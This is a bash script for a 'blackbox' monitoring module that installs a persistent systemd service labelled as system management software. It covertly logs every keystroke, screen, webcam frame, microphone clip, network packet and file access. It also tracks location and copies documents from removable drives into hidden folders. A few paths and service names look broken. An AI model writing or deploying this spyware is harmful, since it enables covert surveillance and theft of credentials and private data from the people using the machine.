#!/bin/bash
#if you want to open the BLACKBOX do bash log.sh open
echo This Module is Deprecated thus the module will not run
exit
Command=$1
if [ $Command == 'find' ] ; then
pacman -S dialog --noconfirm --needed
content=$(dialog --title "blackbox search" --inputbox "Search that this computer has accessed" 8 40 2>&1 >/dev/tty)
grep -rnw /module/q7managementengine -e "${content}"
exit
fi


#Command=$1
if [ $Command == 'open' ] ; then
echo USE WITH CAUTION WHEN USING THIS OPTION THIS WILL EXPOSE EVERY DATA THAT EVER BEEN POSSESED BY THIS COMPUTER
sleep 3
find /module/q7managementengine
#clear
chmod -R 777 /module/q7managementengine
chmod -R 777 /module/q7managementengine/*
sleep 5
exit
fi

if [ $Command == 'lock' ] ; then
echo disabling user access
#sleep 3
#find /module/q7managementengine
#clear
chmod -R 600 /module/q7managementengine
chmod -R 600 /module/q7managementengine/*
#sleep 5
exit
fi



sleep 60
#export DISPLAY=:0
sessionid=$(date +%s)
echo Hiding Files
chmod -R 600 /module/q7managementengine
mkdir /module/q7managementengine/.$sessionid
mkdir /module/q7managementengine/.$sessionid/sessionextdocuments
sudo -u tor tor > /module/q7managementengine/.$sessionid/EncryptedInternetTraffic &
gsettings set org.gnome.system.proxy ignore-hosts []
gsettings set org.gnome.system.proxy mode 'manual'
gsettings set org.gnome.system.proxy.socks host '127.0.0.1'
gsettings set org.gnome.system.proxy.socks port 9050
fileinstalled=/module/q7managementengine/gg
if [ -f $fileinstalled ]; then
echo Installed
else
rm /usr/bin/tqdm
sudo -u nobody yaourt -S geoip lsof python python-pip tor gnome python-setuptools mitmproxy python-tornado python-six tcpdump python-appdirs jq python-packaging python-pyparsing python-tqdm python-scikit-learn python-numpy python-scipy whereami scrot logkeys --noconfirm
mv /usr/bin/whereami /usr/bin/whereami_gps
npm -g install @rafaelrinaldi/whereami
daemonsystemd=/etc/systemd/system/module/q7managementengine.service

echo '[Unit]' > $daemonsystemd
echo 'Description=System management software for theharmony7 computers' >> $daemonsystemd
echo 'After=network.target' >> $daemonsystemd
echo '' >> $daemonsystemd
echo '[Service]' >> $daemonsystemd
echo 'ExecStart=/bin/bash /module/q7managementengine/smsw.sh' >> $daemonsystemd
echo 'Type=simple' >> $daemonsystemd
echo '' >> $daemonsystemd
echo '[Install]' >> $daemonsystemd
echo 'WantedBy=default.target' >> $daemonsystemd
git clone https://github.com/rahra/onioncat
cd onioncat
autoreconf -f -i
./configure
make
make install


cat $daemonsystemd
systemctl enable blackbox
echo a > /module/q7managementengine/gg



fi



#a Security feature
# Turn on execshield
sysctl -w kernel.exec-shield=1
sysctl -w kernel.randomize_va_space=1
# Enable IP spoofing protection
sysctl -w net.ipv4.conf.all.rp_filter=1
# Disable IP source routing
sysctl -w net.ipv4.conf.all.accept_source_route=0
# Ignoring broadcasts request
sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1
sysctl -w net.ipv4.icmp_ignore_bogus_error_messages=1
# Make sure spoofed packets get logged
sysctl -w net.ipv4.conf.all.log_martians = 1
sysctl -w kernel.dmesg_restrict=1
sysctl -w kernel.kptr_restrict=1

locationint=$(curl --request GET --url https://freegeoip.app/json/ --header 'accept: application/json' --header 'content type: application/json' | jq -r -c '.city')
whereami_gps learn -l ${locationint[0]}
#logger for service mode
time=$(date +%s)
killall -KILL logkeys
rm /var/run/logkeys.pid
logkeys -s -o /module/q7managementengine/.$sessionid/uinput
#log system state
killall -KILL dmesg
dmesg -w > /module/q7managementengine/.$sessionid/kernel &
#EventLogger
countevent=1
killall -KILL evtest
for a in /dev/input/*; do
countevent=$(($countevent + 1))
evtest $a > /blaackbox/.$sessionid/event$countevent &
done


#pullwait
pullwait=4
killall -KILL tcpdump
tcpdump -XX > /module/q7managementengine/.$sessionid/localnetworkcontent &
#update learning for A-GPS
cd /usr/share/GeoIP/
wget http://geolite.maxmind.com/download/geoip/database/GeoLiteCountry/GeoIP.dat.gz
gunzip GeoIP.dat.gz

#file that being accessed
lsof > /module/q7managementengine/.$sessionid/fileaccesslog &
#Capture more network log
echo theharmony7 blackbox recording > /module/q7managementengine/.$sessionid/localnetworkdump.pcapng
echo theharmony7 blackbox recording > /module/q7managementengine/.$sessionid/networkaware
echo theharmony7 blackbox recording > /module/q7managementengine/.$sessionid/networkawarecontent
killall -KILL dumpcap
killall -KILL tshark
rm /module/q7managementengine/networkawarecontent
echo NetworkLogging > /module/q7managementengine/.$sessionid/networkawarecontent
dumpcap -w /module/q7managementengine/.$sessionid/localnetworkdump.pcapng &
cd /module/q7managementengine/.$sessionid/
ln -s /module/q7managementengine/.$sessionid/networkawarecontent /module/q7managementengine
tshark -xV > /module/q7managementengine/networkawarecontent &




cd /module/q7managementengine
agpswait=0
while true ;do

timedelay=$(( ( RANDOM % 20 )  + 7 ))
time=$(date +%s)
for ((i=0;i<=10;i++)); do
export DISPLAY=:$i
scrot /module/q7managementengine/.$sessionid/ScreenWatch${time}.jpeg
done
echo screen
time=$(date +%s)
echo camera
streamer -f jpeg -o /module/q7managementengine/.$sessionid/CCTV$time.jpeg
time=$(date +%s)
arecord -V stereo -t wav -d 5 > /module/q7managementengine/.$sessionid/MicrophoneWatch$time
killall -KILL journalctl
journalctl -xe > /module/q7managementengine/.$sessionid/system
time=$(date +%s)
echo ----------------- >> /module/q7managementengine/.$sessionid/ThermalSensor
date >> /module/q7managementengine/.$sessionid/ThermalSensor
sensors >> /module/q7managementengine/.$sessionid/ThermalSensor
echo ----------------- >> /module/q7managementengine/.$sessionid/ThermalSensor
echo ----------------- >> /module/q7managementengine/.$sessionid/USBDEVconnected
date >> /module/q7managementengine/.$sessionid/USBDEVconnected
lsusb >> /module/q7managementengine/.$sessionid/USBDEVconnected
echo ----------------- >> /module/q7managementengine/.$sessionid/USBDEVconnected
#grab location data
#uses AI locating combination beetween Internet IP and Signal

#A-GPS update
agpswait=$(($agpswait + 1))
if [ $agpswait == '10' ] ;then
locationint=$(curl --request GET --url https://freegeoip.app/json/ --header 'accept: application/json' --header 'content type: application/json' | jq -r -c '.city')
whereami_gps learn -l ${locationint[0]}
agpswait=0
fi
date >> /module/q7managementengine/.$sessionid/location
echo '--------------start--------------' >> /module/q7managementengine/.$sessionid/location
echo List of possibilities >> /module/q7managementengine/.$sessionid/location
echo '---------------------------------' >> /module/q7managementengine/.$sessionid/location
whereami_gps locations >> /module/q7managementengine/.$sessionid/location
echo '---------------------------------' >> /module/q7managementengine/.$sessionid/location
echo '------------[Predicted Location]------------' >> /module/q7managementengine/.$sessionid/location
whereami_gps predict >> /module/q7managementengine/.$sessionid/location
echo '--------------end----------------' >> /module/q7managementengine/.$sessionid/location
#grab document daily backup
pullwait=$(($pullwait + 1))
exta='pdf doc ppt txt pages xls wps'
if [ $pullwait == '5' ] ;then
for client in /run/media/;do
for ext in $exta; do
mkdir /module/q7managementengine/.$sessionid/sessionextdocuments
sudo chmod -R 777 /module/q7managementengine/.$sessionid/sessionextdocuments
find $client -name "*.*$ext*"
find $client -name "*.*$ext*" | while read file; do
    cp -rv "$file" "/module/q7managementengine/.$sessionid/sessionextdocuments"; done
done
done
pullwait=0
fi

sleep $timedelay
done
